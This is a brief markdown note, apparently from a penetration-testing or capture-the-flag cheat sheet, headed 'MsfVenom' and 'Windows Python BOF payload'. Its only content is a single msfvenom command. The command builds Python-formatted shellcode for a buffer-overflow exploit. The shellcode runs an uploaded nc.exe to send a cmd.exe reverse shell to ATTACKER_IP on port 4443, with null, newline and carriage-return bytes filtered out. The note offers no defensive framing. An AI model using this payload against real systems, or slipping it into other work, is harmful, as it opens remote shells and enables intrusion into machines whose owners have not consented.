# MsfVenom

Windows Python BOF payload
---
```console
msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe ATTACKER_IP 4443' -b '\x00\x0a\x0d' -f py -v payload
```

